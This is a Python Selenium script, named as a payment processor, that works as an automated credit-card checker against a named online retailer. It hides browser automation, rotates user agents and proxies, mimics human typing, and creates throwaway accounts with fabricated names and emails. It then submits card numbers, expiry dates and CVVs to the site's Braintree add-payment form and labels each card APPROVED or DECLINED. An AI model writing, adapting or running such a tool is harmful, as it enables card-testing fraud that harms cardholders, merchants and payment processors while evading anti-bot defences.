import random
import string
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.proxy import Proxy, ProxyType
import logging

logger = logging.getLogger(__name__)

class PaymentProcessor:
    def __init__(self, headless=True, proxy_url=None):
        self.driver = None
        self.wait = None
        self.headless = headless
        self.proxy_url = proxy_url
    
    def setup_driver(self):
        """Inizializza il driver selenium con proxy"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # Aggiungi opzioni per evitare detection
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_argument("--disable-features=VizDisplayCompositor")
            chrome_options.add_argument("--disable-ipc-flooding-protection")
            chrome_options.add_argument("--disable-renderer-backgrounding")
            chrome_options.add_argument("--disable-backgrounding-occluded-windows")
            
            # USER AGENT casuale
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
            ]
            chrome_options.add_argument(f"--user-agent={random.choice(user_agents)}")
            
            # CONFIGURA PROXY se fornito
            if self.proxy_url:
                logger.info(f"🔌 Usando proxy: {self.proxy_url}")
                if self.proxy_url.startswith('http'):
                    chrome_options.add_argument(f'--proxy-server={self.proxy_url}')
                else:
                    # Per proxy in formato IP:PORT
                    chrome_options.add_argument(f'--proxy-server=http://{self.proxy_url}')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            
            # Esegui script per nascondere automation
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.driver.execute_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})")
            self.driver.execute_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
            
            self.wait = WebDriverWait(self.driver, 20)
            logger.info("✅ Driver Chrome con proxy inizializzato")
            return True
        except Exception as e:
            logger.error(f"❌ Errore inizializzazione driver: {e}")
            return False
    
    def generate_credentials(self):
        """Genera credenziali più realistiche"""
        first_names = ["alex", "michael", "chris", "jordan", "tyler", "brandon", "ryan"]
        last_names = ["smith", "johnson", "williams", "brown", "jones", "miller", "davis"]
        
        first = random.choice(first_names)
        last = random.choice(last_names)
        username = f"{first}{last}{random.randint(10, 999)}"
        email = f"{first}.{last}@gmail.com"
        
        return username, email
    
    def generate_postal_code(self):
        """Genera CAP più realistici"""
        # CAP italiani realistici
        italian_caps = ["20100", "00100", "10100", "30100", "40100", "50100"]
        return random.choice(italian_caps)
    
    def close_all_popups(self):
        """Chiude popup con più tentativi"""
        popup_selectors = [
            ".klaviyo-close-form",
            ".fancybox-close",
            ".modal-close",
            ".popup-close",
            "[aria-label='Close']",
            ".btn-close"
        ]
        
        for selector in popup_selectors:
            try:
                close_btn = self.driver.find_element(By.CSS_SELECTOR, selector)
                if close_btn.is_displayed():
                    close_btn.click()
                    logger.info(f"✅ Popup chiuso con: {selector}")
                    time.sleep(1)
            except:
                continue
        
        try:
            cookie_banner = self.driver.find_element(By.CSS_SELECTOR, ".cli-bar-message")
            accept_btn = self.driver.find_element(By.CSS_SELECTOR, ".cli-bar-btn_optin, .cli-button")
            accept_btn.click()
            logger.info("✅ Banner cookie chiuso")
            time.sleep(2)
        except:
            pass

    def create_account(self):
        """Crea account con più randomizzazione"""
        try:
            logger.info("🔵 Creazione account...")
            self.driver.get("https://www.calipercovers.com/my-account/")
            time.sleep(random.uniform(4, 7))  # Tempo random
            
            self.close_all_popups()
            
            username, email = self.generate_credentials()
            logger.info(f"👤 Credenziali generate: {username}, {email}")
            
            # Compila username se presente
            try:
                username_field = self.driver.find_element(By.ID, "reg_username")
                username_field.clear()
                # Inserimento più umano
                for char in username:
                    username_field.send_keys(char)
                    time.sleep(random.uniform(0.05, 0.1))
                logger.info("✅ Username compilato")
            except:
                logger.info("ℹ️ Campo username non trovato")
            
            # Compila email
            email_field = self.wait.until(EC.element_to_be_clickable((By.ID, "reg_email")))
            email_field.clear()
            for char in email:
                email_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.1))
            logger.info("✅ Email compilata")
            
            self.close_all_popups()
            
            # Clicca registrazione
            register_btn = self.driver.find_element(By.CSS_SELECTOR, "button[name='register']")
            self.driver.execute_script("arguments[0].scrollIntoView(true);", register_btn)
            time.sleep(random.uniform(1, 3))
            self.driver.execute_script("arguments[0].click();", register_btn)
            logger.info("✅ Registrazione inviata")
            
            # Attesa più lunga e random
            time.sleep(random.uniform(8, 12))
            
            current_url = self.driver.current_url
            if "my-account" in current_url and "register" not in current_url:
                logger.info("✅ Account creato con successo")
                return username, email
            else:
                logger.error(f"❌ Registrazione fallita - URL: {current_url}")
                return None, None
                
        except Exception as e:
            logger.error(f"❌ Errore durante registrazione: {e}")
            return None, None

    def find_and_fill_braintree_field(self, field_name, value):
        """Compila campi Braintree con comportamento umano"""
        self.driver.switch_to.default_content()
        time.sleep(random.uniform(0.5, 1.5))
        
        iframe_mapping = {
            'card number': [
                "iframe[name='braintree-hosted-field-number']",
                "iframe[title*='card number']",
                "iframe[title*='Credit Card Number']",
                "iframe[data-braintree-name='number']"
            ],
            'expiration': [
                "iframe[name='braintree-hosted-field-expirationDate']",
                "iframe[title*='expiration']",
                "iframe[title*='Expiration Date']",
                "iframe[data-braintree-name='expirationDate']"
            ],
            'cvv': [
                "iframe[name='braintree-hosted-field-cvv']",
                "iframe[title*='cvv']",
                "iframe[title*='CVV']",
                "iframe[data-braintree-name='cvv']"
            ],
            'postal code': [
                "iframe[name='braintree-hosted-field-postalCode']",
                "iframe[title*='postal']",
                "iframe[title*='Postal Code']",
                "iframe[data-braintree-name='postalCode']"
            ]
        }
        
        if field_name in iframe_mapping:
            for iframe_selector in iframe_mapping[field_name]:
                try:
                    iframe = self.driver.find_element(By.CSS_SELECTOR, iframe_selector)
                    self.driver.switch_to.frame(iframe)
                    
                    input_selectors = ["input", "input[type='text']", "input[type='tel']", "#credit-card-number"]
                    for input_selector in input_selectors:
                        try:
                            input_field = self.driver.find_element(By.CSS_SELECTOR, input_selector)
                            if input_field.is_displayed() and input_field.is_enabled():
                                input_field.clear()
                                # Inserimento umano con pause random
                                for char in str(value):
                                    input_field.send_keys(char)
                                    time.sleep(random.uniform(0.03, 0.08))
                                self.driver.switch_to.default_content()
                                logger.info(f"✅ Campo {field_name} compilato")
                                return True
                        except:
                            continue
                    
                    self.driver.switch_to.default_content()
                except:
                    self.driver.switch_to.default_content()
                    continue
        
        logger.warning(f"❌ Campo {field_name} non trovato")
        return False

    def detect_payment_errors(self):
        """Cerca errori con più precisione"""
        error_selectors = [
            ".woocommerce-error", 
            ".payment-error", 
            ".braintree-error",
            ".error-message",
            ".notice-error",
            ".alert-error",
            "[class*='error']",
            "#payment-error",
            ".gateway-error",
            "ul.woocommerce-error li"
        ]
        
        error_messages = []
        for selector in error_selectors:
            try:
                error_elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                for element in error_elements:
                    if element.is_displayed():
                        text = element.text.strip()
                        if text and len(text) > 5:
                            error_messages.append(text)
                            logger.info(f"🔴 Errore rilevato: {text}")
            except:
                continue
        
        # Cerca nel testo della pagina
        page_text = self.driver.page_source.lower()
        page_html = self.driver.page_source
        
        error_patterns = [
            ("gateway rejected", "Gateway Rejected"),
            ("fraud", "Fraud detected"),
            ("card was declined", "Card declined"),
            ("do not honor", "Do not honor"),
            ("insufficient funds", "Insufficient funds"),
            ("processor declined", "Processor declined"),
            ("invalid card", "Invalid card"),
            ("expired card", "Expired card"),
            ("cvv mismatch", "CVV mismatch"),
            ("transaction not allowed", "Transaction not allowed")
        ]
        
        for pattern, message in error_patterns:
            if pattern in page_text:
                logger.info(f"🔴 Trovato: {message}")
                error_messages.append(message)
        
        return error_messages

    def detect_payment_success(self):
        """Cerca successi"""
        success_selectors = [
            ".woocommerce-message", 
            ".payment-success",
            ".success-message",
            ".notice-success",
            ".alert-success",
            "div.woocommerce-message"
        ]
        
        success_messages = []
        for selector in success_selectors:
            try:
                success_elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                for element in success_elements:
                    if element.is_displayed():
                        text = element.text.strip()
                        if text and len(text) > 5:
                            success_messages.append(text)
                            logger.info(f"✅ Successo rilevato: {text}")
            except:
                continue
        
        page_text = self.driver.page_source.lower()
        
        success_patterns = [
            "payment method has been added",
            "successfully",
            "approved",
            "payment method added",
            "card added"
        ]
        
        for pattern in success_patterns:
            if pattern in page_text:
                logger.info(f"✅ Trovato: {pattern}")
                success_messages.append(pattern.title())
        
        return success_messages

    def process_payment(self, card_data):
        """Processa pagamento con proxy"""
        try:
            logger.info(f"🚀 Inizio processo pagamento con proxy: {self.proxy_url}")
            
            if not self.setup_driver():
                return "ERROR_DRIVER_INIT"
            
            # Crea account
            username, email = self.create_account()
            if not username:
                return "ERROR_ACCOUNT_CREATION"
            
            logger.info(f"✅ Account creato: {username}")
            
            # Processa pagamento
            self.driver.get("https://www.calipercovers.com/my-account/add-payment-method/")
            time.sleep(random.uniform(4, 6))
            
            self.close_all_popups()
            time.sleep(random.uniform(2, 4))
            
            # Compila campi carta
            logger.info("💳 Compilazione dati carta...")
            
            if not self.find_and_fill_braintree_field("card number", card_data['number']):
                return "ERROR_CARD_NUMBER"
            time.sleep(random.uniform(1, 3))
            
            expiry_formats = [card_data['expiry'][:2] + "/" + card_data['expiry'][2:], card_data['expiry']]
            expiry_success = False
            for expiry_value in expiry_formats:
                if self.find_and_fill_braintree_field("expiration", expiry_value):
                    expiry_success = True
                    break
            if not expiry_success:
                return "ERROR_EXPIRY"
            time.sleep(random.uniform(1, 3))
            
            if not self.find_and_fill_braintree_field("cvv", card_data['cvv']):
                return "ERROR_CVV"
            time.sleep(random.uniform(1, 3))
            
            postal_code = self.generate_postal_code()
            if not self.find_and_fill_braintree_field("postal code", postal_code):
                postal_selectors = [
                    "input#postal-code", 
                    "input[name='postal-code']",
                    "input[data-braintree-name='postalCode']",
                    "#billing_postcode"
                ]
                postal_success = False
                for selector in postal_selectors:
                    try:
                        postal_field = self.driver.find_element(By.CSS_SELECTOR, selector)
                        if postal_field.is_displayed():
                            postal_field.clear()
                            for char in postal_code:
                                postal_field.send_keys(char)
                                time.sleep(0.05)
                            postal_success = True
                            logger.info(f"✅ CAP compilato: {postal_code}")
                            break
                    except:
                        continue
                if not postal_success:
                    return "ERROR_POSTAL_CODE"
            
            time.sleep(random.uniform(2, 4))
            
            # Submit
            logger.info("🔵 Invio pagamento...")
            submit_selectors = [
                "button[type='submit']", 
                "#place_order",
                "[value*='Add Payment']",
                "button[name='woocommerce_add_payment_method']",
                ".button[name='woocommerce_add_payment_method']"
            ]
            submit_btn = None
            for selector in submit_selectors:
                try:
                    submit_btn = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if submit_btn.is_displayed() and submit_btn.is_enabled():
                        logger.info(f"✅ Pulsante submit trovato: {selector}")
                        break
                except:
                    continue
            
            if not submit_btn:
                return "ERROR_SUBMIT_BUTTON"
            
            self.driver.execute_script("arguments[0].scrollIntoView(true);", submit_btn)
            time.sleep(random.uniform(1, 3))
            self.driver.execute_script("arguments[0].click();", submit_btn)
            logger.info("✅ Pagamento inviato")
            
            # Attesa lunga per elaborazione
            time.sleep(15)
            
            # Analisi risultato
            error_messages = self.detect_payment_errors()
            success_messages = self.detect_payment_success()
            current_url = self.driver.current_url
            
            logger.info(f"📊 Risultato - Errori: {len(error_messages)}, Successi: {len(success_messages)}")
            
            if error_messages:
                return f"DECLINED - {error_messages[0][:80]}"
            elif success_messages:
                return f"APPROVED - {success_messages[0][:80]}"
            elif "add-payment-method" not in current_url:
                return "APPROVED - Payment completed"
            else:
                return "UNKNOWN - No clear result"
                
        except Exception as e:
            logger.error(f"❌ Errore durante pagamento: {e}")
            return f"ERROR: {str(e)}"
        finally:
            if self.driver:
                self.driver.quit()

# Funzione con supporto proxy
def process_card_payment(card_number, expiry, cvv, headless=True, proxy_url=None):
    """
    Processa una carta di pagamento con proxy
    Args:
        card_number: Numero carta
        expiry: Scadenza (MMYY)
        cvv: CVV
        headless: Modalità headless
        proxy_url: URL del proxy (opzionale)
    """
    processor = PaymentProcessor(headless=headless, proxy_url=proxy_url)
    card_data = {
        'number': card_number,
        'expiry': expiry.replace('/', ''),
        'cvv': cvv
    }
    return processor.process_payment(card_data)